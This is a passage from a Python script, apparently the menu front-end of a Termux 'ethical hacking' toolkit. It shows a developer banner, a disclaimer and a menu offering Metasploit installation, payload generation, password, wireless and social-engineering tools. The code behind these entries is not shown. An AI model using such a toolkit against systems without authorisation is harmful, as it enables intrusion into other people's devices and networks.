{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║                         ABOUT THE DEVELOPER                                 ║
{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════════════╣
{Fore.CYAN}║                                                                              ║
{Fore.YELLOW}║                    SC-ETHICAL HACKER IN BANGLADESH                          ║
{Fore.CYAN}║                                                                              ║
{Fore.GREEN}║  Name: SC-ETHICAL HACKER                                                     ║
{Fore.GREEN}║  Location: Bangladesh                                                        ║
{Fore.GREEN}║  Expertise: Ethical Hacking & Cybersecurity                                 ║
{Fore.GREEN}║  Experience: 5+ Years in Penetration Testing                                ║
{Fore.GREEN}║                                                                              ║
{Fore.BLUE}║  Certifications:                                                             ║
{Fore.BLUE}║  - Certified Ethical Hacker (CEH)                                           ║
{Fore.BLUE}║  - Offensive Security Certified Professional (OSCP)                         ║
{Fore.BLUE}║  - CompTIA Security+                                                        ║
{Fore.CYAN}║                                                                              ║
{Fore.YELLOW}║  Mission: To provide advanced security tools                                ║
{Fore.YELLOW}║  and promote ethical hacking practices                                      ║
{Fore.YELLOW}║  in Bangladesh and worldwide                                                ║
{Fore.CYAN}║                                                                              ║
{Fore.RED}║  ⚠ DISCLAIMER: This tool is for educational purposes only.                 ║
{Fore.RED}║  The developer is not responsible for any misuse.                           ║
{Fore.RED}║  Always obtain proper authorization before testing.                         ║
{Fore.CYAN}║                                                                              ║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}
        """)
        
        input(f"\n{Fore.YELLOW}[*] Press Enter to continue...")

    # ==================== MAIN MENU ====================
    def main_menu(self):
        """Display Main Menu"""
        while self.running:
            self.animate_banner()
            
            print(f"\n{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"{Fore.RED}║{Fore.YELLOW}{Style.BRIGHT}                      ULTIMATE TOOLKIT MENU                                {Fore.RED}║")
            print(f"{Fore.RED}╠══════════════════════════════════════════════════════════════════════════════╣")
            print(f"{Fore.RED}║ {Fore.GREEN}[1]  {Fore.WHITE}Install Metasploit in Termux    {Fore.RED}║ {Fore.GREEN}[7]  {Fore.WHITE}Wireless Tools               {Fore.RED}║")
            print(f"{Fore.RED}║ {Fore.GREEN}[2]  {Fore.WHITE}Advanced Network Scanner       {Fore.RED}║ {Fore.GREEN}[8]  {Fore.WHITE}Social Engineering Toolkit   {Fore.RED}║")
            print(f"{Fore.RED}║ {Fore.GREEN}[3]  {Fore.WHITE}Web Vulnerability Scanner     {Fore.RED}║ {Fore.GREEN}[9]  {Fore.WHITE}Forensics Toolkit            {Fore.RED}║")
            print(f"{Fore.RED}║ {Fore.GREEN}[4]  {Fore.WHITE}Password Toolkit               {Fore.RED}║ {Fore.GREEN}[10] {Fore.WHITE}Cryptography Toolkit         {Fore.RED}║")
            print(f"{Fore.RED}║ {Fore.GREEN}[5]  {Fore.WHITE}Payload Generator              {Fore.RED}║ {Fore.GREEN}[11] {Fore.WHITE}Launch Metasploit Console    {Fore.RED}║")
            print(f"{Fore.RED}║ {Fore.GREEN}[6]  {Fore.WHITE}Information Gathering          {Fore.RED}║ {Fore.GREEN}[12] {Fore.WHITE}System Information           {Fore.RED}║")
            print(f"{Fore.RED}╠══════════════════════════════════════════════════════════════════════════════╣")
            print(f"{Fore.RED}║ {Fore.GREEN}[13] {Fore.WHITE}About Developer                {Fore.RED}║ {Fore.GREEN}[0]  {Fore.WHITE}Exit                         {Fore.RED}║")
            print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")
            
            # Get current time
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"{Fore.MAGENTA}[{current_time}] {Fore.LIGHTBLUE_EX}SC-ETHICAL HACKER IN BANGLADESH {Fore.WHITE}Toolkit v{self.version}")
            
            choice = input(f"\n{Fore.CYAN}{Style.BRIGHT}[?] SC-ETHICAL HACKER > Select option (0-13): {Fore.RESET}")
            
            # Menu dictionary
            menu_options = {
                "1": self.install_metasploit_termux,
                "2": self.advanced_network_scanner,
                "3": self.web_vulnerability_scanner,
                "4": self.password_toolkit,
                "5": self.payload_generator,
                "6": self.information_gathering,
                "7": self.wireless_tools,
                "8": self.social_engineering_toolkit,
                "9": self.forensics_toolkit,
                "10": self.crypto_toolkit,
                "11": self.metasploit_launcher,
                "12": lambda: self.show_system_info(),
                "13": self.about_developer,
                "0": self.exit_program
            }
            
            if choice in menu_options:
                if choice == "0":
                    menu_options[choice]()
                    break
                else:
                    menu_options[choice]()
                    input(f"\n{Fore.YELLOW}[*] Press Enter to return to main menu...")
            else:
                print(f"\n{Fore.RED}[!] Invalid option! Please try again.")
                time.sleep(1)
    
    def show_system_info(self):
        """Display System Information"""
        print(f"\n{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}║{Fore.YELLOW}                       SYSTEM INFORMATION                                 {Fore.BLUE}║")
        print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")
        
        info = self.system_info()
        for key, value in info.items():
            print(f"{Fore.CYAN}{key}: {Fore.GREEN}{value}")
        
        # Additional info
        print(f"{Fore.CYAN}Tool Version: {Fore.GREEN}{self.version}")
        print(f"{Fore.CYAN}Author: {Fore.GREEN}{self.author}")
        print(f"{Fore.CYAN}Location: {Fore.GREEN}{self.location}")
    
    def exit_program(self):
        """Exit the program with animation"""
        self.running = False
        print(f"\n{Fore.YELLOW}[*] Shutting down SC-ETHICAL HACKER Toolkit...")
        
        # Exit animation
        chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        for _ in range(3):
            for char in chars:
                sys.stdout.write(f'\r{Fore.RED}[{char}] Exiting...')
                sys.stdout.flush()
                time.sleep(0.1)
        
        print(f"\n\n{Fore.GREEN}{Style.BRIGHT}")
        print("╔══════════════════════════════════════════════════════════════════════════════╗")
        print("║                                                                              ║")
        print("║     Thank you for using SC-ETHICAL HACKER IN BANGLADESH Toolkit!            ║")
        print("║                                                                              ║")
        print("║     Remember: With great power comes great responsibility.                  ║")
        print("║     Use this knowledge ethically and legally only.                          ║")
        print("║                                                                              ║")
        print("║     HAPPY ETHICAL HACKING!                                                  ║")
        print("║                                                                              ║")
        print("╚══════════════════════════════════════════════════════════════════════════════╝")
        print(f"{Fore.RESET}")
        sys.exit()

def main():
    """Main function"""
    # Check for required modules
    required_modules = ['colorama', 'requests']
    missing_modules = []
    
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        print(f"{Fore.YELLOW}[*] Installing required modules: {', '.join(missing_modules)}")
        for module in missing_modules:
            os.system(f"pip install {module}")
    
    # Check if running in Termux
    is_termux = 'com.termux' in os.environ.get('PREFIX', '')
    
    if is_termux:
        print(f"{Fore.GREEN}[✓] Running in Termux Environment")
    else:
        print(f"{Fore.YELLOW}[!] Not running in Termux. Some features may not work.")
    
    # Initialize and run
    hacker = SCETHICAL_HACKER_PROFESSIONAL()
    hacker.main_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Interrupted by user.")
        print(f"{Fore.YELLOW}[*] Exiting gracefully...")
        sys.exit()
    except Exception as e:
        print(f"\n{Fore.RED}[!] Unexpected Error: {e}")
        sys.exit(1)